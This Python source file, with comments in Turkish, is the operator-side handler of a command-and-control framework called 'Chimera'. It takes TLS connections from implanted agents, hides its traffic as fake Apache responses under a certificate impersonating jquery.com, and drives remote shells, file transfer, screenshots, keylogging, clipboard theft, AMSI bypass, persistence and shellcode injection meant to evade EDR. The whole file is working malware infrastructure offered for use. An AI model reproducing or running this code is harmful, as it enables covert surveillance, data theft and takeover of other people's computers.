"""
Chimera Multi-Handler Class
Mevcut exploit/multi/handler mimarisine uygun özel handler sınıfı.
Gelecekteki C2 (AES-256-GCM / ECDH) protokolüne hazırlık içerir.
"""
from core.handler import BaseHandler
from core.shared_state import shared_state
import socket
import threading
import struct
import time
import ssl
import os
import subprocess
import base64
import sys
from datetime import datetime
from rich import print
from typing import Dict, Any, Tuple

# Sertifika dosyaları için yollar
CERT_FILE = "server.crt"
KEY_FILE = "server.key"

class Handler(BaseHandler):
    """
    Chimera Agent için özel handler sınıfı.
    """
    def __init__(self, options: Dict[str, Any]):
        super().__init__(options)
        self.session_id = None
        self.cert_file = os.path.abspath(options.get("CERT_FILE", CERT_FILE))
        self.key_file = os.path.abspath(options.get("KEY_FILE", KEY_FILE))
        self.check_and_generate_cert()

    def check_and_generate_cert(self):
        """SSL sertifikası yoksa oluşturur."""
        if not os.path.exists(self.cert_file) or not os.path.exists(self.key_file):
            print(f"[*] SSL Sertifikası oluşturuluyor... ({self.cert_file})")
            try:
                subprocess.check_call(
                    f'openssl req -new -newkey rsa:2048 -days 365 -nodes -x509 '
                    f'-keyout "{self.key_file}" -out "{self.cert_file}" '
                    f'-subj "/C=US/ST=California/L=San Francisco/O=jQuery Inc/CN=jquery.com"',
                    shell=True,
                    stdout=subprocess.DEVNULL,
                    stderr=subprocess.DEVNULL
                )
                print("[+] Sertifika oluşturuldu.")
            except Exception as e:
                print(f"[!] Sertifika oluşturma hatası: {e}")
                print("[!] Lütfen openssl'in yüklü olduğundan emin olun.")

    def handle_connection(self, client_sock: socket.socket, session_id: int = None):
        """
        Yeni gelen bağlantıyı karşılar ve yönetir.
        """
        self.client_sock = client_sock
        self.session_id = session_id
        
        print(f"[*] Chimera Handler: Yeni bağlantı kabul edildi. (Session: {session_id})")

        # 1. SSL/TLS Handshake (C2 Encryption)
        try:
            context = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
            context.load_cert_chain(certfile=self.cert_file, keyfile=self.key_file)
            
            # AES-256-GCM / ECDH kullanımını teşvik et
            # Modern SSL varsayılanları genellikle bunu yapar ama biz yine de belirtelim
            try:
                context.set_ciphers('ECDHE-ECDSA-AES256-GCM-SHA384:ECDHE-RSA-AES256-GCM-SHA384')
            except Exception:
                pass # Sistem desteklemiyorsa varsayılanları kullan

            self.client_sock = context.wrap_socket(client_sock, server_side=True)
            cipher = self.client_sock.cipher()
            print(f"[*] Şifreli Bağlantı Kuruldu: {cipher[0]} ({cipher[1]} bit) - {cipher[2]}")
            
        except Exception as e:
            print(f"[!] SSL Handshake Hatası: {e}")
            return

        # 2. Ajan Kimlik Doğrulaması / Sistem Bilgisi Alma
        
        # 2. Ajan Kimlik Doğrulaması / Sistem Bilgisi Alma
        try:
            # İlk mesajın sysinfo olmasını bekliyoruz
            sysinfo = self.recv_data()
            if sysinfo:
                print(f"[+] Ajan Bilgisi: {sysinfo}")
                
                # Session manager'daki bilgiyi güncelle (Opsiyonel)
                if shared_state.session_manager and self.session_id:
                     session = shared_state.session_manager.get_session(self.session_id)
                     if session:
                         # Extra info olarak ekle
                         session["info"]["extra"] = sysinfo
                         # Session tipini güncelle
                         session["type"] = "Chimera"

        except Exception as e:
            print(f"[!] Handshake hatası: {e}")
            return

        # 3. Komut Döngüsü (Interactive Session)
        # Bu handler şu an için interaktif modda çalışacak.
        # İleride C2 sunucusu gibi asenkron komut kuyruğu mantığına geçebilir.
        self.interactive_session()

    def send_data(self, data: str):
        """HTTP Response olarak şifreli veri gönderir."""
        if not self.client_sock: return
        try:
            encoded_body = data.encode('utf-8')
            
            # HTTP Response Oluştur (Obfuscation)
            http_response = (
                b"HTTP/1.1 200 OK\r\n"
                b"Server: Apache/2.4.41 (Ubuntu)\r\n"
                b"Date: " + time.strftime("%a, %d %b %Y %H:%M:%S GMT", time.gmtime()).encode() + b"\r\n"
                b"Content-Type: application/javascript; charset=utf-8\r\n"
                b"Content-Length: " + str(len(encoded_body)).encode() + b"\r\n"
                b"Connection: keep-alive\r\n"
                b"\r\n"
            )
            
            self.client_sock.sendall(http_response + encoded_body)
        except Exception as e:
            print(f"[!] Veri gönderme hatası: {e}")

    def recv_data(self) -> str:
        """HTTP Request içinden veriyi okur."""
        if not self.client_sock: return ""
        try:
            # Headerları oku (\r\n\r\n bulana kadar)
            header_buffer = b""
            while b"\r\n\r\n" not in header_buffer:
                chunk = self.client_sock.recv(1)
                if not chunk: return ""
                header_buffer += chunk
            
            # Content-Length bul
            headers = header_buffer.decode('utf-8', errors='ignore')
            content_length = 0
            for line in headers.split('\r\n'):
                if line.lower().startswith('content-length:'):
                    try:
                        content_length = int(line.split(':')[1].strip())
                    except:
                        pass
            
            # Body'yi oku
            body = b""
            while len(body) < content_length:
                chunk = self.client_sock.recv(content_length - len(body))
                if not chunk: break
                body += chunk
                
            return body.decode('utf-8')
        except Exception as e:
            print(f"[!] Veri alma hatası: {e}")
            return ""

    def start_shell_mode(self):
        """Raw socket üzerinden shell etkileşimini yönetir."""
        print("-" * 50)
        print("[*] Raw Shell Moduna geçildi.")
        print("[*] Çıkış için 'exit' yazıp Enter'layın.")
        print("-" * 50)
        
        stop_event = threading.Event()
        
        def recv_loop():
            """Socket -> STDOUT"""
            while not stop_event.is_set():
                try:
                    if not self.client_sock: break
                    data = self.client_sock.recv(1024)
                    if not data:
                        stop_event.set()
                        break
                    # Gelen veriyi direkt ekrana bas
                    print(data.decode('utf-8', errors='replace'), end='', flush=True)
                except Exception:
                    stop_event.set()
                    break

        t = threading.Thread(target=recv_loop, daemon=True)
        t.start()
        
        try:
            while not stop_event.is_set():
                # Kullanıcıdan veri al (sys.stdin.readline() satır bazlı okuma yapar)
                try:
                    cmd = sys.stdin.readline()
                except EOFError:
                    break
                
                if not cmd: break
                
                if cmd.strip() == "exit":
                    # Çıkış sinyali gönder
                    if self.client_sock:
                        try:
                            self.client_sock.send(b"exit_shell_mode_now")
                        except:
                            pass
                    stop_event.set()
                    break
                
                # Veriyi gönder
                if self.client_sock:
                    try:
                        self.client_sock.send(cmd.encode('utf-8'))
                    except:
                        stop_event.set()
                        break
                
        except KeyboardInterrupt:
            if self.client_sock:
                try:
                    self.client_sock.send(b"exit_shell_mode_now")
                except:
                    pass
            stop_event.set()
            
        print("\n[*] Shell modundan çıkıldı. Bağlantı yenileniyor...")
        # Bağlantıyı kapat (Agent reconnect atacak)
        if self.client_sock:
            try:
                self.client_sock.close()
            except:
                pass
            self.client_sock = None
            self.session_id = None # Session düştü


    def interactive_session(self):
        """Basit interaktif komut satırı."""
        print("-" * 50)
        print(f"[*] Chimera Session {self.session_id} aktif. Çıkmak için 'background' veya 'bg'.")
        print("-" * 50)
        
        while True:
            try:
                cmd = input(f"chimera ({self.session_id}) > ")
                if not cmd.strip(): continue
                
                cmd_lower = cmd.strip().lower()
                
                if cmd_lower in ["exit", "quit"]:
                    # Session'ı kapat
                    print("[*] Bağlantı kapatılıyor...")
                    self.send_data("terminate")
                    break
                    
                if cmd_lower in ["background", "bg"]:
                    # Arka plana at (Session açık kalır)
                    print(f"[*] Session {self.session_id} arka plana atıldı.")
                    break
                
                # Yardım komutu
                if cmd_lower in ["help", "?"]:
                    help_text = """
╔════════════════════════════════════════════════════════════════╗
║              CHIMERA AGENT - KULLANILABILIR KOMUTLAR           ║
╚════════════════════════════════════════════════════════════════╝

[Oturum Yönetimi]
  background, bg        - Oturumu arka plana at
  exit, quit            - Ajanı sonlandır ve bağlantıyı kes

[Sistem Bilgisi]
  sysinfo               - Detaylı sistem bilgisi (OS, IP, process, yetki)
  detect                - Ortam analizi (AV/EDR ve VM/Sandbox tespiti)
  pwd                   - Mevcut dizini göster
  
[Dosya İşlemleri]
  ls [path]             - Dizin içeriğini listele
  cd <path>             - Dizin değiştir
  mkdir <path>          - Klasör oluştur
  rm <path>             - Dosya/klasör sil
  upload <local> [remote] - Dosya yükle
  download <remote>     - Dosya indir

[Gözetleme]
  screenshot            - Anlık ekran görüntüsü al (RAM üzerinden)
  keylogger_start       - Keylogger başlat (Windows)
  keylogger_stop        - Keylogger durdur
  keylogger_dump        - Tuş kayıtlarını getir ve kaydet
  clipboard_get         - Pano içeriğini oku
  clipboard_set <text>  - Pano içeriğini değiştir

[Komut Çalıştırma]
  shell                 - İnteraktif shell başlat
  <komut>               - Sistem komutu çalıştır (örn: whoami, ipconfig)

[Modül Yönetimi]
  loadmodule <file>     - Python modülünü hafızaya yükle
  runmodule <name> [func] - Yüklü modülü çalıştır
  listmodules           - Yüklü modülleri listele

[Evasion & Persistence]
  amsi_bypass           - Windows AMSI korumasını bellekte patchle (Bypass)
  persistence_install   - Ajanı sistem başlangıcına ekle (Kalıcılık)
  persistence_remove    - Kalıcılık ayarlarını temizle

[Process Injection / Migration]
  inject_list                         - Enjeksiyona uygun process'leri listele
  inject_shellcode <PID> <file>       - Shellcode dosyasını hedef PID'e enjekte et
  inject_shellcode_nt <PID> <file>    - NtCreateThreadEx ile enjeksiyon (EDR atlatma)
  inject_migrate <PID> [file]         - Hedef process'e migrate et (opsiyonel shellcode)

═══════════════════════════════════════════════════════════════════
"""
                    print(help_text)
                    continue

                # Modül Yükleme: Yerel Python dosyasını uzak ajanın belleğine yükle
                if cmd_lower.startswith("loadmodule "):
                    try:
                        parts = cmd.split(" ", 1)
                        if len(parts) < 2:
                            print("[!] Kullanım: loadmodule <local_file_path>")
                            continue
                        
                        file_path = parts[1].strip()
                        if not os.path.exists(file_path):
                            print(f"[!] Dosya bulunamadı: {file_path}")
                            continue
                        
                        # Dosyayı oku ve encode et
                        with open(file_path, "rb") as f:
                            file_content = f.read()
                            b64_content = base64.b64encode(file_content).decode('utf-8')
                        
                        # Dosya adından modül adı türet (uzantısız)
                        filename = os.path.basename(file_path)
                        module_name = os.path.splitext(filename)[0]
                        
                        # Yeni komutu hazırla
                        print(f"[*] Modül gönderiliyor: {module_name} ({len(file_content)} bytes)")
                        cmd = f"loadmodule {module_name} {b64_content}"
                        
                    except Exception as e:
                        print(f"[!] Modül hazırlama hatası: {str(e)}")
                        continue

                # Process Injection: Shellcode dosyasını oku ve enjekte et
                # Kullanım: inject_shellcode <PID> <local_shellcode_file>
                if cmd_lower.startswith("inject_shellcode ") or cmd_lower.startswith("inject_shellcode_nt "):
                    try:
                        use_nt = cmd_lower.startswith("inject_shellcode_nt ")
                        prefix = "inject_shellcode_nt " if use_nt else "inject_shellcode "
                        rest   = cmd[len(prefix):].strip().split(None, 1)

                        if len(rest) < 2:
                            print(f"[!] Kullanım: {prefix.strip()} <PID> <local_shellcode_file>")
                            continue

                        target_pid    = rest[0]
                        sc_file_path  = rest[1].strip()

                        if not os.path.exists(sc_file_path):
                            print(f"[!] Shellcode dosyası bulunamadı: {sc_file_path}")
                            continue

                        with open(sc_file_path, "rb") as _f:
                            sc_bytes = _f.read()

                        b64_sc = base64.b64encode(sc_bytes).decode("utf-8")
                        print(f"[*] Shellcode yükleniyor: {sc_file_path} ({len(sc_bytes)} bytes) → PID {target_pid}")

                        nt_prefix = "nt:" if use_nt else ""
                        cmd = f"inject_shellcode_b64 {target_pid} {nt_prefix}{b64_sc}"

                    except Exception as e:
                        print(f"[!] Inject hazırlık hatası: {str(e)}")
                        continue

                # inject_migrate <PID> [local_shellcode_file]
                if cmd_lower.startswith("inject_migrate "):
                    try:
                        rest = cmd[len("inject_migrate "):].strip().split(None, 1)

                        if not rest:
                            print("[!] Kullanım: inject_migrate <PID> [local_shellcode_file]")
                            continue

                        target_pid = rest[0]

                        if len(rest) == 2:
                            sc_file_path = rest[1].strip()
                            if not os.path.exists(sc_file_path):
                                print(f"[!] Shellcode dosyası bulunamadı: {sc_file_path}")
                                continue

                            with open(sc_file_path, "rb") as _f:
                                sc_bytes = _f.read()

                            b64_sc = base64.b64encode(sc_bytes).decode("utf-8")
                            print(f"[*] Migration shellcode hazırlanıyor: {sc_file_path} ({len(sc_bytes)} bytes) → PID {target_pid}")
                            cmd = f"inject_migrate {target_pid} {b64_sc}"
                        else:
                            cmd = f"inject_migrate {target_pid}"

                    except Exception as e:
                        print(f"[!] inject_migrate hazırlık hatası: {str(e)}")
                        continue

                # Dosya Yükleme: Yerel dosyayı uzak sisteme transfer et
                if cmd_lower.startswith("upload "):
                    try:
                        parts = cmd.split(" ", 2)
                        if len(parts) < 2:
                            print("[!] Kullanım: upload <local_path> [remote_path]")
                            continue
                        
                        local_path = parts[1]
                        remote_path = parts[2] if len(parts) > 2 else os.path.basename(local_path)
                        
                        if not os.path.exists(local_path):
                            print(f"[!] Dosya bulunamadı: {local_path}")
                            continue
                            
                        with open(local_path, "rb") as f:
                            file_content = f.read()
                            b64_content = base64.b64encode(file_content).decode('utf-8')
                            
                        print(f"[*] Dosya yükleniyor: {local_path} -> {remote_path} ({len(file_content)} bytes)")
                        cmd = f"upload {remote_path} {b64_content}"
                        
                    except Exception as e:
                        print(f"[!] Upload hazırlık hatası: {str(e)}")
                        continue

                # Komutu gönder
                self.send_data(cmd)

                # Shell Modu: İnteraktif shell oturumu başlat
                if cmd_lower == "shell":
                    # Önce "Shell başlatıldı" mesajını bekle
                    response = self.recv_data()
                    print(response)
                    
                    if "[+]" in response:
                         self.start_shell_mode()
                         # Shell modundan dönünce loop'tan çık (yeni bağlantı beklenecek)
                         break
                    else:
                        continue
                
                # Normal komut cevabı bekle
                response = self.recv_data()
                if response:
                    # Dosya İndirme: İndirilen dosyayı yerel sisteme kaydet
                    if response.startswith("DOWNLOAD_OK:"):
                        try:
                            # Format: DOWNLOAD_OK:<base64>
                            b64_data = response.split(":", 1)[1]
                            file_content = base64.b64decode(b64_data)
                            
                            # Dosya adını komuttan çıkarmaya çalış
                            # Orijinal komut: download <remote_path>
                            # Biz burada orijinal 'cmd' değişkenini kullanıyoruz ama 'cmd' overwrite edilmiş olabilir mi?
                            # Hayır, 'download' komutu upload bloğuna girmediği için 'cmd' orijinal halinde.
                            
                            parts = cmd.split(" ")
                            if len(parts) >= 2:
                                filename = os.path.basename(parts[1])
                            else:
                                filename = f"downloaded_{int(time.time())}.bin"
                                
                            # Varsa download klasörüne kaydet, yoksa current dir
                            save_path = os.path.join(os.getcwd(), filename)
                            
                            with open(save_path, "wb") as f:
                                f.write(file_content)
                                
                            print(f"[+] Dosya başarıyla indirildi: {save_path} ({len(file_content)} bytes)")
                        except Exception as e:
                            print(f"[!] Download kaydetme hatası: {str(e)}")
                    
                    # Ekran Görüntüsü: Gelen screenshot verisini dosyaya kaydet
                    elif response.startswith("SCREENSHOT_OK:"):
                        try:
                            b64_data = response.split(":", 1)[1]
                            img_data = base64.b64decode(b64_data)
                            
                            # screenshots klasörünü oluştur
                            screenshots_dir = os.path.join(os.getcwd(), "screenshots")
                            os.makedirs(screenshots_dir, exist_ok=True)
                            
                            # Dosya formatını belirle (BMP veya PNG)
                            if img_data[:2] == b'BM':
                                ext = "bmp"
                            else:
                                ext = "png"
                            
                            # Timestamp ile dosya adı oluştur
                            timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
                            filename = f"screenshot_{timestamp}_session{self.session_id}.{ext}"
                            save_path = os.path.join(screenshots_dir, filename)
                            
                            with open(save_path, "wb") as f:
                                f.write(img_data)
                            
                            # Dosya boyutunu insan okunabilir formata çevir
                            size_kb = len(img_data) / 1024
                            if size_kb > 1024:
                                size_str = f"{size_kb/1024:.2f} MB"
                            else:
                                size_str = f"{size_kb:.2f} KB"
                            
                            print(f"[+] 📸 Ekran görüntüsü kaydedildi!")
                            print(f"    Dosya : {save_path}")
                            print(f"    Boyut : {size_str}")
                            print(f"    Format: {ext.upper()}")
                        except Exception as e:
                            print(f"[!] Screenshot kaydetme hatası: {str(e)}")

                    # Keylogger Dökümü: Gelen logları kaydet
                    elif response.startswith("KEYLOG_DUMP:"):
                        try:
                            b64_logs = response.split(":", 1)[1]
                            logs = base64.b64decode(b64_logs).decode('utf-8')
                            
                            # logs klasörünü oluştur
                            logs_dir = os.path.join(os.getcwd(), "logs")
                            os.makedirs(logs_dir, exist_ok=True)
                            
                            timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
                            filename = f"keylog_{timestamp}_session{self.session_id}.txt"
                            save_path = os.path.join(logs_dir, filename)
                            
                            with open(save_path, "w", encoding="utf-8") as f:
                                f.write(logs)
                                
                            print(f"[+] ⌨️ Keylogger dökümü alındı!")
                            print(f"    Dosya : {save_path}")
                            print(f"    Boyut : {len(logs)} karakter")
                            print("-" * 40)
                            # Ekrana da bas (kısaca)
                            lines = logs.split('\n')
                            print("\n".join(lines[:10])) # İlk 10 satırı göster
                            if len(lines) > 10:
                                print(f"... (toplam {len(lines)} satır)")
                            print("-" * 40)
                                
                        except Exception as e:
                            print(f"[!] Keylog kaydetme hatası: {str(e)}")

                    # Clipboard Verisi: Pano içeriğini göster
                    elif response.startswith("CLIPBOARD_DATA:"):
                        try:
                            b64_content = response.split(":", 1)[1]
                            content = base64.b64decode(b64_content).decode('utf-8')
                            
                            print("-" * 40)
                            print("[+] 📋 Pano İçeriği:")
                            print("-" * 40)
                            print(content)
                            print("-" * 40)
                        except Exception as e:
                            print(f"[!] Pano verisi okuma hatası: {str(e)}")
                            
                    else:
                        print(response)
                else:
                    print("[!] Bağlantı koptu.")
                    break
                    
            except KeyboardInterrupt:
                print("\n[*] Interaktif moddan çıkılıyor (Ctrl+C).")
                break
            except Exception as e:
                print(f"[!] Hata: {e}")
                break
